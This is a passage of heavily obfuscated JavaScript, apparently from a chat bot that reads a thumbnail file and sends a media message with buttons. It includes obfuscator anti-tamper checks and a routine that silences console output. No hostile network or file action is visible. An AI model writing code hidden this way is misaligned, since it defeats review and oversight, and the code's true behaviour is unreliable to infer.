_0x42a4df+_0x18b97f;},'dhoLf':function(_0x3ccc7b,_0x3e6b58){return _0x3ccc7b===_0x3e6b58;},'KyFjh':_0x5aea03(-0x194,-0x157,-0x146,-0x1b0,-0x1d7),'iQYWt':_0x5aea03(-0x15d,-0x1b0,-0x14a,-0x139,-0x109),'DQjLI':_0x5e732d(0x175,0x113,0x23e,0x1b2,0x16c),'eoAbO':function(_0x512507){return _0x512507();},'sGEHo':function(_0x8af5a4,_0x53e904,_0x4ec7f6){return _0x8af5a4(_0x53e904,_0x4ec7f6);}};function _0x5e732d(_0x3d0eef,_0xe33a51,_0x9731fb,_0x5d4205,_0x2d5beb){return _0x3198(_0x5d4205- -0x137,_0x3d0eef);}_0x344d6f[_0x5aea03(-0x16f,-0x19b,-0x123,-0x100,-0x10f)](_0x55f89a,this,function(){function _0x79141f(_0x2e82b7,_0x2c964a,_0x1f8feb,_0x10f361,_0x1c89e9){return _0x2d46aa(_0x2e82b7-0x9,_0x2c964a-0x1ea,_0x1c89e9,_0x10f361-0x189,_0x1c89e9-0x1b);}function _0x441c12(_0x3ae4ea,_0x172c1a,_0xb6d82c,_0x6db3b6,_0x508265){return _0x45389b(_0x3ae4ea-0xaa,_0x172c1a-0x126,_0x3ae4ea,_0x6db3b6-0x16,_0xb6d82c- -0x16a);}function _0x35ac02(_0x3cd659,_0x566b84,_0x5cbcc4,_0x1a8797,_0x358f36){return _0x5e732d(_0x3cd659,_0x566b84-0x44,_0x5cbcc4-0x72,_0x358f36-0x1d6,_0x358f36-0x171);}const _0x4ed169={'GXDlZ':_0x344d6f[_0x441c12(0x3aa,0x389,0x35d,0x2cc,0x2d2)],'yQzxP':_0x344d6f[_0x441c12(0x477,0x41a,0x3e2,0x3b3,0x410)],'anWIb':function(_0x4b664f,_0x43f6da){function _0x24a603(_0x2700a9,_0xdef321,_0x4094de,_0x161288,_0x21560c){return _0x441c12(_0x21560c,_0xdef321-0x51,_0xdef321-0x8b,_0x161288-0x4f,_0x21560c-0x1a9);}return _0x344d6f[_0x24a603(0x399,0x39c,0x39b,0x355,0x374)](_0x4b664f,_0x43f6da);},'lvbOg':_0x344d6f[_0x1bdbe1(-0x16b,-0xce,-0x36,-0x178,-0x29)],'VdkaB':function(_0x522e87,_0x59383d){function _0x59bd83(_0x5cde6c,_0x2cbc6a,_0x4bce64,_0x2005f8,_0x2ee77e){return _0x1bdbe1(_0x5cde6c-0x67,_0x4bce64-0x293,_0x2cbc6a,_0x2005f8-0x19a,_0x2ee77e-0x187);}return _0x344d6f[_0x59bd83(0xd2,0x110,0x142,0x10e,0xbf)](_0x522e87,_0x59383d);},'txlJD':_0x344d6f[_0x79141f(0xb1,0x2e,0xfa,0x15a,0x19)],'ttzgG':function(_0x25bce1,_0x1523a7){function _0x5a2406(_0x2f4471,_0x5219a2,_0x50406f,_0x4e762b,_0x2b66ee){return _0x79141f(_0x2f4471-0x1ba,_0x5219a2-0xb4,_0x50406f-0x16b,_0x4e762b-0x182,_0x2b66ee);}return _0x344d6f[_0x5a2406(0x19b,0x132,0x1c7,0x1bf,0x17a)](_0x25bce1,_0x1523a7);},'uFVfa':_0x344d6f[_0x79141f(0xbd,0x94,0x19,0x72,0x88)],'qoGER':function(_0x268779){function _0x49ebe3(_0x2967f7,_0x23c80e,_0x51a3aa,_0x18395f,_0x498c4e){return _0x2507c0(_0x2967f7-0xa6,_0x23c80e-0x3a,_0x18395f- -0x50,_0x18395f-0x9,_0x51a3aa);}return _0x344d6f[_0x49ebe3(-0x1b4,-0x1c8,-0x21c,-0x1e6,-0x1c5)](_0x268779);},'CYwIM':function(_0x3f1f9c,_0x230f31,_0xc0e7a){function _0x1ece43(_0x507479,_0x5b5666,_0x17639a,_0x23681c,_0x264af8){return _0x79141f(_0x507479-0x3da,_0x5b5666-0x40,_0x17639a-0x10a,_0x23681c-0x168,_0x5b5666);}return _0x344d6f[_0x1ece43(0x3b6,0x389,0x380,0x364,0x3d7)](_0x3f1f9c,_0x230f31,_0xc0e7a);}};function _0x2507c0(_0x2b793c,_0x102bc6,_0x592798,_0x2acae0,_0x5111bc){return _0x5e732d(_0x5111bc,_0x102bc6-0x86,_0x592798-0x1a2,_0x592798- -0x24c,_0x5111bc-0x3c);}function _0x1bdbe1(_0x573945,_0x4b4966,_0x4973d8,_0x4a7612,_0x3524c8){return _0x45389b(_0x573945-0x1e,_0x4b4966-0x64,_0x4973d8,_0x4a7612-0xb8,_0x4b4966- -0x5e8);}if(_0x344d6f[_0x441c12(0x337,0x385,0x354,0x35d,0x35c)](_0x344d6f[_0x35ac02(0x2ab,0x2ed,0x236,0x290,0x2d7)],_0x344d6f[_0x35ac02(0x206,0x286,0x2e6,0x251,0x28a)]))_0x4ed169[_0x35ac02(0x3b4,0x3cc,0x3cf,0x3cd,0x366)](_0x62ec3,this,function(){function _0x287a45(_0x4c7ee8,_0x33626a,_0x1e4c9c,_0x21d894,_0x1851c1){return _0x35ac02(_0x1e4c9c,_0x33626a-0x1b4,_0x1e4c9c-0x47,_0x21d894-0xfa,_0x33626a- -0x2b5);}const _0x461368=new _0x3c5ecc(_0x4ed169[_0x392e80(0x450,0x42b,0x3e2,0x40f,0x3e4)]),_0x10a093=new _0x471589(_0x4ed169[_0x392e80(0x46a,0x4f0,0x4b4,0x46e,0x4d4)],'i');function _0x51b0c5(_0x2957c7,_0x3faa95,_0x501de0,_0x374b90,_0x558c83){return _0x79141f(_0x501de0-0x17,_0x3faa95-0x71,_0x501de0-0x87,_0x374b90-0x8d,_0x374b90);}function _0x5b26ae(_0x484100,_0x3e3570,_0xf17b18,_0x3d79e3,_0xc982b7){return _0x79141f(_0x484100-0x215,_0x3e3570-0x165,_0xf17b18-0x1a0,_0x3d79e3-0x9c,_0x3d79e3);}function _0x392e80(_0x5a644c,_0x2b625b,_0x1a2235,_0x53ec03,_0x41d2b9){return _0x35ac02(_0x1a2235,_0x2b625b-0x69,_0x1a2235-0x181,_0x53ec03-0x17,_0x2b625b-0x1af);}function _0x326d67(_0x2ed419,_0x4c87cb,_0x241e22,_0x1b5a35,_0x52aa6b){return _0x1bdbe1(_0x2ed419-0x100,_0x241e22-0x2b9,_0x2ed419,_0x1b5a35-0x17,_0x52aa6b-0x125);}const _0x3e7b98=_0x4ed169[_0x287a45(0x24,0xcd,0x5c,0xb0,0xd7)](_0x253675,_0x4ed169[_0x326d67(0x22a,0x141,0x1b9,0x22f,0x1bf)]);!_0x461368[_0x51b0c5(0x77,-0x19,-0x29,0x20,0x58)](_0x4ed169[_0x51b0c5(0xb2,0x68,0xb1,0xa0,0x26)](_0x3e7b98,_0x4ed169[_0x326d67(0x2d0,0x2b6,0x22c,0x1fd,0x221)]))||!_0x10a093[_0x5b26ae(0x1d5,0x21b,0x13b,0x26b,0x151)](_0x4ed169[_0x392e80(0x575,0x557,0x511,0x585,0x544)](_0x3e7b98,_0x4ed169[_0x5b26ae(0x1f2,0x20a,0x207,0x152,0x274)]))?_0x4ed169[_0x51b0c5(0xe5,0x14a,0xd9,0xc6,0x45)](_0x3e7b98,'0'):_0x4ed169[_0x287a45(-0x9d,-0x3f,-0xa8,-0xad,-0x73)](_0x5aa5b6);})();else{const _0x5be03b=new RegExp(_0x344d6f[_0x1bdbe1(-0xd8,-0x121,-0x119,-0x153,-0x1b6)]),_0x4437f2=new RegExp(_0x344d6f[_0x2507c0(-0x41,-0xbc,-0xce,-0x112,-0xaf)],'i'),_0x59a00d=_0x344d6f[_0x79141f(-0x3d,-0xf,-0xdf,0x7,0x48)](_0x83adbf,_0x344d6f[_0x2507c0(-0x13b,-0xc9,-0x100,-0x84,-0x172)]);if(!_0x5be03b[_0x1bdbe1(-0x1c4,-0x170,-0x119,-0x19a,-0x13f)](_0x344d6f[_0x79141f(0xe4,0x103,0xbb,0xfe,0x131)](_0x59a00d,_0x344d6f[_0x1bdbe1(-0x3,-0x7f,-0x5,-0xf9,-0x56)]))||!_0x4437f2[_0x35ac02(0x2ba,0x23a,0x309,0x31f,0x280)](_0x344d6f[_0x441c12(0x4da,0x3c8,0x432,0x458,0x459)](_0x59a00d,_0x344d6f[_0x2507c0(-0xa2,-0xc0,-0xa5,-0x8f,-0xcc)]))){if(_0x344d6f[_0x441c12(0x2d2,0x2b2,0x320,0x3ba,0x3c0)](_0x344d6f[_0x2507c0(-0x185,-0x13e,-0x1bd,-0x1f6,-0x21c)],_0x344d6f[_0x2507c0(-0x11f,-0x1a0,-0x1bd,-0x251,-0x1c4)]))_0x344d6f[_0x35ac02(0x288,0x213,0x2dc,0x2a8,0x283)](_0x59a00d,'0');else{const _0x5c6aab=_0x5bfa27[_0x441c12(0x2e0,0x352,0x352,0x3c7,0x31f)+_0x2507c0(-0xfa,-0x5f,-0x9d,-0x74,-0xd)+'r'][_0x441c12(0x452,0x44c,0x3ca,0x406,0x3d7)+_0x35ac02(0x3aa,0x3b1,0x396,0x3dd,0x37a)][_0x1bdbe1(-0xb4,-0x44,0x32,-0x8d,-0xca)](_0x3998a2),_0x3280fe=_0x452f58[_0x485084],_0x6024dc=_0x783455[_0x3280fe]||_0x5c6aab;_0x5c6aab[_0x2507c0(-0x158,-0x186,-0x1ae,-0x1a0,-0x1dc)+_0x441c12(0x3bb,0x486,0x3e3,0x45c,0x39d)]=_0x9a0f39[_0x35ac02(0x3cc,0x42e,0x453,0x3bb,0x3ac)](_0x1760c7),_0x5c6aab[_0x35ac02(0x296,0x310,0x2dc,0x333,0x294)+_0x35ac02(0x2a0,0x263,0x36e,0x333,0x2f6)]=_0x6024dc[_0x79141f(-0x2c,-0xa6,-0x3f,-0x85,-0x2)+_0x2507c0(-0x123,-0x10e,-0x12c,-0x171,-0xc7)][_0x1bdbe1(0x10,-0x44,-0x9a,0x4,-0x80)](_0x6024dc),_0x29e3ec[_0x3280fe]=_0x5c6aab;}}else _0x344d6f[_0x79141f(-0x2e,-0x99,-0x4d,0x3c,0x5a)](_0x344d6f[_0x2507c0(-0xbc,-0x9f,-0xde,-0x64,-0x15b)],_0x344d6f[_0x1bdbe1(-0xe1,-0x47,-0xe,-0xae,-0x74)])?_0x4ed169[_0x35ac02(0x259,0x212,0x2e7,0x2bc,0x276)](_0x5c4e42):_0x344d6f[_0x35ac02(0x408,0x3a6,0x449,0x421,0x3a6)](_0x83adbf);}})();}());const _0xfd528a=function(){function _0x46f6bc(_0x293dce,_0x1a02af,_0x12a660,_0x350f38,_0x474d91){return _0x3198(_0x350f38-0x28c,_0x293dce);}const _0x244663={};function _0x2239b2(_0x3923f5,_0x45f801,_0x5f3f0e,_0x1ea294,_0x50c509){return _0x3198(_0x3923f5-0x3,_0x50c509);}_0x244663[_0x4573c6(0x1a2,0x196,0x18b,0x24a,0x21a)]=function(_0x2dc614,_0x5b6339){return _0x2dc614!==_0x5b6339;};function _0x38b325(_0x38cd51,_0x381715,_0xbef537,_0x1ce389,_0x417246){return _0x3198(_0x1ce389- -0x8a,_0xbef537);}function _0x47bf2c(_0x223bb3,_0x2f6eb5,_0x555044,_0x320a4a,_0x2b72f1){return _0x3198(_0x223bb3-0x34b,_0x2b72f1);}_0x244663[_0x47bf2c(0x50c,0x4ee,0x4d9,0x530,0x592)]=_0x38b325(0x218,0x1ee,0x18c,0x1f4,0x1af),_0x244663[_0x46f6bc(0x547,0x4af,0x499,0x49e,0x48f)]=_0x4573c6(0xf7,0xd2,0x12f,0xb3,0x141),_0x244663[_0x46f6bc(0x549,0x46f,0x4f9,0x4ed,0x4c3)]=function(_0xba8b8a,_0x4403e6){return _0xba8b8a===_0x4403e6;},_0x244663[_0x38b325(0x19c,0x280,0x172,0x1e3,0x241)]=_0x4573c6(0x108,0x8a,0x16d,0xeb,0x76),_0x244663[_0x46f6bc(0x54d,0x4de,0x5b1,0x557,0x4ae)]=_0x47bf2c(0x5cc,0x5ba,0x5db,0x521,0x619),_0x244663[_0x38b325(0xf3,0x15e,0x1bd,0x136,0xac)]=_0x2239b2(0x27b,0x20d,0x29e,0x237,0x200),_0x244663[_0x47bf2c(0x5b9,0x65a,0x650,0x610,0x665)]=_0x47bf2c(0x603,0x5f6,0x60d,0x640,0x595);const _0x4deb1=_0x244663;function _0x4573c6(_0x362f18,_0x13c184,_0x18abe1,_0x1482be,_0x21923e){return _0x3198(_0x362f18- -0x135,_0x1482be);}let _0x1e36df=!![];return function(_0x25d8cb,_0x106cea){function _0x5e662b(_0x5755ad,_0x4c29b2,_0x1755d8,_0x27518b,_0x28125a){return _0x2239b2(_0x4c29b2-0xf,_0x4c29b2-0x6d,_0x1755d8-0xc8,_0x27518b-0x15a,_0x28125a);}function _0x2fcee6(_0x26de6c,_0x56cb7a,_0x407a52,_0x40fa78,_0x5f1f77){return _0x38b325(_0x26de6c-0x6,_0x56cb7a-0x88,_0x26de6c,_0x56cb7a-0x3ae,_0x5f1f77-0x1a2);}function _0x2e03e2(_0x851f17,_0x2f6c7e,_0x3ea7be,_0x318422,_0x320749){return _0x46f6bc(_0x851f17,_0x2f6c7e-0x6d,_0x3ea7be-0x6c,_0x318422- -0x27a,_0x320749-0x129);}function _0x129858(_0xfe653a,_0x54bd6e,_0x53ed56,_0x696113,_0x20aca2){return _0x46f6bc(_0x54bd6e,_0x54bd6e-0x1cc,_0x53ed56-0x12c,_0x20aca2- -0x53,_0x20aca2-0x64);}if(_0x4deb1[_0x2fcee6(0x61f,0x585,0x4d9,0x4f6,0x53a)](_0x4deb1[_0x5e662b(0x231,0x1d2,0x159,0x1d1,0x154)],_0x4deb1[_0x5e662b(0x2f6,0x280,0x1f1,0x2c1,0x2e2)])){const _0x5a0423=_0x355929[_0x2fcee6(0x5f4,0x596,0x63b,0x56b,0x570)](_0x1456ba,arguments);return _0x2b55a8=null,_0x5a0423;}else{const _0x8e4825=_0x1e36df?function(){function _0x3ca43c(_0x3134c6,_0x49e8e0,_0x41aba5,_0x589e4e,_0x46f821){return _0x2e03e2(_0x41aba5,_0x49e8e0-0x135,_0x41aba5-0xab,_0x589e4e-0x289,_0x46f821-0x1b2);}function _0x205f3f(_0x27ecbb,_0x1857d7,_0x1ac0c1,_0x447fb0,_0x161c11){return _0x2fcee6(_0x447fb0,_0x27ecbb- -0x16c,_0x1ac0c1-0x81,_0x447fb0-0x38,_0x161c11-0x16a);}function _0x497186(_0x4fe6b4,_0x3d3c25,_0x526f97,_0x4d1227,_0x2f2320){return _0x5e662b(_0x4fe6b4-0x15a,_0x2f2320- -0x6e,_0x526f97-0xb6,_0x4d1227-0xe0,_0x4d1227);}function _0x11c570(_0x41ea00,_0x2817ee,_0x5c5082,_0x5a9e8d,_0x21d823){return _0x129858(_0x41ea00-0x43,_0x5a9e8d,_0x5c5082-0xdd,_0x5a9e8d-0x31,_0x41ea00- -0x283);}function _0x319eb0(_0x4e93e0,_0x2a263d,_0x35629a,_0x4a2358,_0x404d6f){return _0x2e03e2(_0x404d6f,_0x2a263d-0x136,_0x35629a-0x15d,_0x4e93e0-0x116,_0x404d6f-0x108);}if(_0x4deb1[_0x11c570(0x28d,0x1f4,0x337,0x2cd,0x236)](_0x4deb1[_0x497186(0x132,0x20a,0x132,0x12d,0x165)],_0x4deb1[_0x3ca43c(0x454,0x551,0x475,0x4ad,0x484)])){if(_0x106cea){if(_0x4deb1[_0x205f3f(0x419,0x444,0x3d7,0x37e,0x4ab)](_0x4deb1[_0x11c570(0x223,0x21b,0x295,0x282,0x1f1)],_0x4deb1[_0x497186(0x2fb,0x2fa,0x23c,0x202,0x26f)]))_0x500a14=_0x3db9ae;else{const _0x2eedd4=_0x106cea[_0x11c570(0x228,0x2ca,0x2bb,0x2a5,0x1a4)](_0x25d8cb,arguments);return _0x106cea=null,_0x2eedd4;}}}else{if(_0x132cbc){const _0x26754a=_0x3c9e5a[_0x319eb0(0x39a,0x32a,0x396,0x3af,0x40a)](_0x3518df,arguments);return _0xeaeabf=null,_0x26754a;}}}:function(){};return _0x1e36df=![],_0x8e4825;}};}(),_0x196589=_0xfd528a(this,function(){const _0x18f41d={'AuSOQ':function(_0x287aba){return _0x287aba();},'nPTNL':function(_0x2e35c7,_0x535198){return _0x2e35c7!==_0x535198;},'FXiUc':_0xac3e19(0x1be,0x1fb,0x130,0x12c,0x1cd),'GGQGj':function(_0x42ecce,_0x149e52){return _0x42ecce===_0x149e52;},'dUoKM':_0xac3e19(0x1e7,0x16f,0x28f,0x218,0x202),'FxwlP':function(_0x3a8183,_0x350aa8){return _0x3a8183(_0x350aa8);},'lUAnE':function(_0x62c42f,_0x67ddd9){return _0x62c42f+_0x67ddd9;},'YEwjN':_0xac3e19(0x17a,0xec,0x12b,0x16c,0x20d)+_0xac3e19(0x129,0x143,0xdb,0xfb,0x139)+_0x36cda8(0x161,0xc8,0x10f,0xe7,0x134)+_0xf119b5(-0x28,0x15,0x1a,-0x5c,-0x22),'JRkAg':_0xf119b5(0xe5,0x13f,0xb6,0x19d,0x1d3)+_0x4d9c0f(0x303,0x332,0x3c9,0x32f,0x3d2)+_0xac3e19(0x1d9,0x18f,0x255,0x184,0x272)+_0xac3e19(0x162,0x142,0xf5,0x177,0x12e)+_0x3630b4(0x112,0x113,0x1c1,0x169,0xd5)+_0xf119b5(0x111,0x71,0xc4,0x39,0xff)+'\x20)','hnqUP':function(_0x59c6af,_0x3a7956){return _0x59c6af!==_0x3a7956;},'JPDBd':_0xac3e19(0x11c,0xf9,0x120,0xce,0xf2),'cUNuL':_0x36cda8(0x87,0xa6,0xc8,0x83,0x117),'nNWRF':function(_0x2ca5f3){return _0x2ca5f3();},'LTIPy':_0x36cda8(0x5b,0x48,0xde,-0x1f,0x90),'TbCow':_0xf119b5(0x155,0xdd,0x133,0x14a,0x11d),'YpzwC':_0xf119b5(0x21,0x1d,-0x21,-0x5d,-0x7c),'mhyZu':_0x3630b4(0x1ea,0x1d4,0x147,0x18f,0x1c7),'eVULs':_0x36cda8(0x10c,0xbc,0x1a8,0xd4,0x147)+_0x36cda8(0x14a,0xd1,0x147,0xce,0x17e),'wqOkn':_0x36cda8(0xb2,0x77,0x104,0x3f,0xd9),'fdFIg':_0x36cda8(0x148,0x11a,0x150,0xfe,0xa9),'EITYh':function(_0x4349ae,_0x1a4b91){return _0x4349ae<_0x1a4b91;},'JnAuJ':function(_0x1d8762,_0x386048){return _0x1d8762===_0x386048;},'jPxSZ':_0x36cda8(0xc0,0xd8,0x4a,0x5d,0x117)},_0x1f3d92=function(){function _0x1028e1(_0x3f0214,_0x60f422,_0x331179,_0x4be06e,_0x309a95){return _0xac3e19(_0x309a95- -0x19d,_0x60f422-0x4e,_0x331179-0x72,_0x60f422,_0x309a95-0x102);}const _0x4363ba={'qyHMB':function(_0x52c68c){function _0x3ed352(_0x4d8e89,_0x1f9a5c,_0xcbcb2d,_0x5adbb7,_0x428a3b){return _0x3198(_0x5adbb7- -0x2f2,_0x1f9a5c);}return _0x18f41d[_0x3ed352(-0xb1,-0x96,-0x72,-0x61,0x3)](_0x52c68c);}};function _0xce2619(_0x27ee12,_0x4c5eef,_0x11278f,_0x13d8cf,_0x40ce71){return _0x36cda8(_0x4c5eef-0x10,_0x4c5eef-0x12a,_0x27ee12,_0x13d8cf-0x184,_0x40ce71-0x153);}function _0xdc5f5b(_0x4b38e6,_0x1b83d2,_0x1ebba9,_0x4d0f8a,_0x535cd5){return _0x3630b4(_0x4b38e6-0x167,_0x1b83d2-0x35,_0x535cd5,_0x1b83d2- -0x128,_0x535cd5-0x50);}function _0xcef2e7(_0x257096,_0x294f94,_0xde166c,_0x1b4227,_0x30dcdf){return _0xf119b5(_0x257096-0xeb,_0x1b4227- -0x140,_0xde166c,_0x1b4227-0xf5,_0x30dcdf-0x12e);}function _0x52c0df(_0x2586e2,_0x5c0929,_0x27dc60,_0x2563d0,_0x1be05e){return _0xac3e19(_0x1be05e-0xb9,_0x5c0929-0x1ae,_0x27dc60-0x6e,_0x5c0929,_0x1be05e-0xb2);}if(_0x18f41d[_0xdc5f5b(0xa,-0x26,-0x6b,0x36,-0xb9)](_0x18f41d[_0x1028e1(0x22,0x45,-0x9,-0x1f,0x60)],_0x18f41d[_0x1028e1(0xdb,0x13,-0x25,0x77,0x60)]))return![];else{let _0x59ac11;try{if(_0x18f41d[_0xdc5f5b(0x135,0x97,0x87,0xa6,0x21)](_0x18f41d[_0xce2619(0xf6,0xf1,0x199,0x8c,0x18d)],_0x18f41d[_0x1028e1(-0x54,-0x22,0x90,-0x4a,-0x1b)]))_0x59ac11=_0x18f41d[_0xdc5f5b(0x43,0x1a,-0x12,-0x80,0x75)](Function,_0x18f41d[_0x1028e1(0x77,-0x1b,0xa,0x4a,0x1d)](_0x18f41d[_0x1028e1(0x1b,0x53,-0x36,0x77,0x1d)](_0x18f41d[_0xdc5f5b(0xc,0x4c,0x11,0x47,-0x5f)],_0x18f41d[_0xcef2e7(-0xf1,-0x138,-0x55,-0xe9,-0xa2)]),');'))();else{const _0x1439b4=_0x37afe1?function(){function _0x222d02(_0x2894e0,_0x58db4f,_0xced691,_0x26fa4a,_0x2d3a7c){return _0xcef2e7(_0x2894e0-0x30,_0x58db4f-0x8b,_0x2894e0,_0x2d3a7c-0x4ec,_0x2d3a7c-0xff);}if(_0x5d04fd){const _0x1936ec=_0x1e66df[_0x222d02(0x4f0,0x3bf,0x4e6,0x424,0x44c)](_0x40991e,arguments);return _0x4c0610=null,_0x1936ec;}}:function(){};return _0x3dda91=![],_0x1439b4;}}catch(_0x14cedc){_0x18f41d[_0x1028e1(0x83,0x27,0x12,0xf2,0x62)](_0x18f41d[_0xdc5f5b(0x86,0x55,0x93,-0x55,-0x3c)],_0x18f41d[_0xcef2e7(-0x91,-0x1ab,-0x137,-0x136,-0x173)])?_0x59ac11=window:_0x4363ba[_0x1028e1(-0x4e,0x5d,0xc2,-0x8f,0x19)](_0x4f3c08);}return _0x59ac11;}};function _0xac3e19(_0x29947c,_0x7444e9,_0x5acbab,_0x29162d,_0x396bfb){return _0x3198(_0x29947c- -0xed,_0x29162d);}function _0x3630b4(_0x1acb00,_0x239d82,_0x5e6ad9,_0x1bc509,_0x883baf){return _0x3198(_0x1bc509- -0xc5,_0x5e6ad9);}const _0x68552c=_0x18f41d[_0x3630b4(0x23b,0x211,0x146,0x1cd,0x168)](_0x1f3d92),_0x131726=_0x68552c[_0x3630b4(0x1b9,0x117,0x198,0x13f,0x1a2)+'le']=_0x68552c[_0xf119b5(0xa6,0x32,-0xf,-0x28,0x21)+'le']||{};function _0x36cda8(_0xa0b536,_0x1ec60f,_0xb3c27e,_0x956a72,_0x24d566){return _0x3198(_0xa0b536- -0x18e,_0xb3c27e);}const _0x517fa2=[_0x18f41d[_0x36cda8(0x78,-0xf,0xa4,0x1b,-0x32)],_0x18f41d[_0x36cda8(0x80,0xe3,-0xb,0xb6,-0x13)],_0x18f41d[_0x4d9c0f(0x358,0x2d9,0x286,0x2cc,0x33d)],_0x18f41d[_0x36cda8(0x3d,0x39,0x7c,0xda,-0x62)],_0x18f41d[_0xf119b5(0x3c,0xb3,0x72,0x9e,0x123)],_0x18f41d[_0x36cda8(0x123,0xdf,0x83,0x1ad,0x15e)],_0x18f41d[_0x36cda8(0x7d,0x18,0x45,0x101,0x72)]];function _0xf119b5(_0x4ae735,_0x1f60b5,_0x47473a,_0x3cf502,_0x58447f){return _0x3198(_0x1f60b5- -0x1d2,_0x47473a);}function _0x4d9c0f(_0x1cc8b6,_0x12ee41,_0x2c700b,_0x2d2c4e,_0x567944){return _0x3198(_0x2d2c4e-0xee,_0x567944);}for(let _0x57c40e=0x9af+0x2c*-0x4c+0x361;_0x18f41d[_0xf119b5(-0x41,-0xd,-0x89,-0x6b,-0x1b)](_0x57c40e,_0x517fa2[_0xac3e19(0x10a,0x19d,0x13d,0xf2,0xd3)+'h']);_0x57c40e++){if(_0x18f41d[_0x36cda8(0x132,0x1c1,0x194,0x19d,0x11e)](_0x18f41d[_0xac3e19(0x127,0x13f,0xf4,0xdb,0x162)],_0x18f41d[_0x3630b4(0x19a,0x19f,0x178,0x14f,0xae)])){const _0x72cce1=_0xfd528a[_0x4d9c0f(0x2f2,0x310,0x33e,0x313,0x363)+_0x4d9c0f(0x3e6,0x3af,0x411,0x3d4,0x32c)+'r'][_0x4d9c0f(0x3e7,0x401,0x3e3,0x38b,0x313)+_0x4d9c0f(0x351,0x43d,0x40d,0x3c9,0x415)][_0xf119b5(0x11c,0x13b,0xd9,0x175,0x12a)](_0xfd528a),_0x183f78=_0x517fa2[_0x57c40e],_0x8ca317=_0x131726[_0x183f78]||_0x72cce1;_0x72cce1[_0xf119b5(0x72,0x3,-0x16,0x52,-0x5b)+_0x3630b4(0x233,0x252,0x1e5,0x1f1,0x1ad)]=_0xfd528a[_0x36cda8(0x17f,0x111,0x1ec,0x152,0x171)](_0xfd528a),_0x72cce1[_0xac3e19(0x108,0xf9,0x68,0x195,0x9c)+_0x36cda8(0xc9,0xc9,0x138,0x83,0xe5)]=_0x8ca317[_0xf119b5(-0x75,0x23,-0x57,-0x5b,0x75)+_0x36cda8(0xc9,0x3b,0xfc,0x123,0xcd)][_0xac3e19(0x220,0x239,0x225,0x21f,0x181)](_0x8ca317),_0x131726[_0x183f78]=_0x72cce1;}else{if(_0x56126f){const _0x1cbb12=_0x37f06a[_0xf119b5(0x101,0xa0,0xf5,0x7,0x89)](_0x3197af,arguments);return _0x34c7a5=null,_0x1cbb12;}}}});function _0x2a2c91(_0x42b87e,_0x8f5c4e,_0x3652e3,_0x5b6c7f,_0x185584){return _0x3198(_0x185584- -0x11f,_0x42b87e);}_0x196589();let content=fs[_0x2a2c91(0x220,0x1b6,0x1a8,0x10b,0x182)+_0x19cd64(0x16a,0x20b,0x264,0x1e8,0x25c)+'nc'](_0x2fbce3(0xc2,0x121,0x166,0x204,0x203)+'/'+thumbnail);const media=await alpha[_0x2a2c91(0x20b,0x1e6,0x1a4,0x12a,0x18e)+_0x4834ce(0x126,0x1c8,0x155,0x13c,0x1ac)+_0x4834ce(0x1d6,0x1a3,0x13e,0xfe,0x1c4)](from,content,MessageType[_0x42ad0a(0x3ef,0x366,0x3fe,0x412,0x2d8)],{'thumbnail':fs[_0x2a2c91(0x114,0xee,0x209,0x1b1,0x182)+_0x42ad0a(0x2d8,0x31d,0x33b,0x30f,0x341)+'nc'](_0x42ad0a(0x39f,0x366,0x3fc,0x327,0x3fa)+'/'+thumbnail)}),_0x40c0f2={};_0x40c0f2[_0x19cd64(0x255,0x271,0x20a,0x23c,0x241)+_0x19cd64(0x334,0x340,0x244,0x2db,0x375)+'t']=_0x4834ce(0x119,0x76,0x88,0x12f,0x49);const _0x37a180={};function _0x3198(_0x51cce6,_0x529a95){return _0x3198=function(_0x83adbf,_0x55f89a){_0x83adbf=_0x83adbf-(0x2529+0x1185+-0x34f2);let _0x548fce=_0x58f8[_0x83adbf];return _0x548fce;},_0x3198(_0x51cce6,_0x529a95);}_0x37a180[_0x2fbce3(0x203,0x15e,0x176,0x168,0x18f)+_0x4834ce(0x158,0x60,0xfd,0x17d,0x91)]=_0x2a2c91(0x13d,0x22b,0x1c7,0x128,0x187);function _0x4834ce(_0x277486,_0x797370,_0x40e89d,_0x3b63f3,_0x5ef46a){return _0x3198(_0x40e89d- -0x14b,_0x3b63f3);}_0x37a180[_0x42ad0a(0x398,0x376,0x35a,0x39b,0x38e)+_0x4834ce(0x20a,0x124,0x1a6,0x1c2,0x14f)]=_0x40c0f2,_0x37a180[_0x2fbce3(0x176,0x229,0x1ee,0x209,0x1f4)]=0x1;const _0x200cdd={};_0x200cdd[_0x19cd64(0x218,0x2ce,0x26d,0x23c,0x2a3)+_0x4834ce(0x135,0x117,0x1b2,0x162,0x222)+'t']=_0x2fbce3(0x1a1,0x126,0x1c5,0x258,0x197);const _0x4e36a5={};function _0x42ad0a(_0x2d717d,_0x239aa6,_0x4ed949,_0x53e0e3,_0x3652fb){return _0x3198(_0x239aa6-0x113,_0x53e0e3);}_0x4e36a5[_0x2a2c91(0x140,0xf2,0x9b,0xf6,0x144)+_0x2fbce3(0x1c8,0x1d3,0x15b,0x196,0x1a2)]=_0x2fbce3(0x189,0x16f,0x142,0x1df,0x1d5),_0x4e36a5[_0x2a2c91(0x180,0xd9,0xcc,0x1de,0x144)+_0x42ad0a(0x48b,0x404,0x471,0x36e,0x3ae)]=_0x200cdd;function _0x2fbce3(_0x4e5ab9,_0x39d501,_0x1d953f,_0x3cf92b,_0x3f4104){return _0x3198(_0x1d953f- -0xed,_0x3cf92b);}_0x4e36a5[_0x19cd64(0x338,0x337,0x35b,0x2b9,0x235)]=0x1;const _0x1014b6={};_0x1014b6[_0x4834ce(0x1a0,0x115,0x113,0xd8,0xd3)+_0x2fbce3(0x1cb,0x164,0x210,0x211,0x294)+'t']=_0x4834ce(0x173,0x133,0x107,0x129,0x19c)+_0x4834ce(0xeb,0x5d,0xa3,0x40,0x5c);const _0x2f08b4={};_0x2f08b4[_0x42ad0a(0x394,0x376,0x314,0x2e7,0x39c)+_0x2a2c91(0x1b9,0x1a3,0x11c,0xe1,0x129)]=_0x2fbce3(0x21d,0x2a0,0x203,0x274,0x18e)+'s',_0x2f08b4[_0x4834ce(0x18a,0xaa,0x118,0x190,0x120)+_0x19cd64(0x255,0x2c0,0x268,0x2cf,0x37a)]=_0x1014b6,_0x2f08b4[_0x2fbce3(0x20a,0x1b7,0x1ee,0x1e8,0x210)]=0x1;const 